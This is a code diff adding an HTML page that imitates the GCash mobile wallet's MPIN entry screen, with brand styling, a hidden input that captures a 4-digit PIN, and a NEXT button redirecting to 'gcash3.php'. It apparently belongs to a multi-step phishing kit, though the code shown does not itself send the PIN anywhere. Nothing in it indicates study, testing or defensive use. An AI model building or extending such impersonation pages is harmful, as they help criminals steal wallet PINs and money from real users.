@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>GCash MPIN</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      background-color: #ffffff;
+      width: 100%;
+      max-width: 400px;
+      border-radius: 16px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      overflow: hidden;
+    }
+
+    .header {
+      background-color: #0072CE;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .form {
+      padding: 20px;
+      text-align: center;
+    }
+
+    .form p {
+      margin-bottom: 20px;
+      color: #333;
+      font-size: 16px;
+    }
+
+    .pin-container {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .pin-circle {
+      width: 50px;
+      height: 50px;
+      border: 2px solid #0072CE;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      font-weight: bold;
+      color: #0072CE;
+      background-color: white;
+    }
+
+    .form button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0072CE;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .form button:hover:enabled {
+      background-color: #005fa3;
+    }
+
+    .form button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+
+    .hidden-input {
+      position: absolute;
+      opacity: 0;
+      pointer-events: none;
+    }
+    
+    @media (max-width: 480px) {
+      .pin-circle {
+        width: 40px;
+        height: 40px;
+        font-size: 18px;
+      }
+
+      .form p {
+        font-size: 14px;
+      }
+
+      .form button {
+        font-size: 15px;
+        padding: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <h2>GCash</h2>
+  </div>
+
+  <div class="form">
+    <p>Enter your 4-digit MPIN</p>
+
+    <div class="pin-container" id="pinDisplay">
+      <div class="pin-circle" style="width: 19px; height: 19px;"></div>
+      <div class="pin-circle" style="width: 19px; height: 19px;"></div>
+      <div class="pin-circle" style="width: 19px; height: 19px;"></div>
+      <div class="pin-circle" style="width: 19px; height: 19px;"></div>
+    </div>
+
+    <input type="tel" maxlength="4" class="hidden-input" id="realInput" autofocus>
+
+    <button id="nextBtn" disabled>NEXT</button>
+  </div>
+</div>
+
+<script>
+  const realInput = document.getElementById("realInput");
+  const circles = document.querySelectorAll(".pin-circle");
+  const nextBtn = document.getElementById("nextBtn");
+
+  document.addEventListener("click", () => {
+    realInput.focus();
+  });
+
+  realInput.addEventListener("input", () => {
+    const value = realInput.value;
+
+    circles.forEach((circle, index) => {
+      circle.textContent = value[index] ? "•" : "";
+    });
+
+    nextBtn.disabled = value.length !== 4;
+  });
+
+  nextBtn.addEventListener("click", () => {
+    const value = realInput.value;
+    if (value.length === 4) {
+      // Redirect to gcash3.php
+      window.location.href = "gcash3.php";
+    }
+  });
+</script>
+
+</body>
+</html>
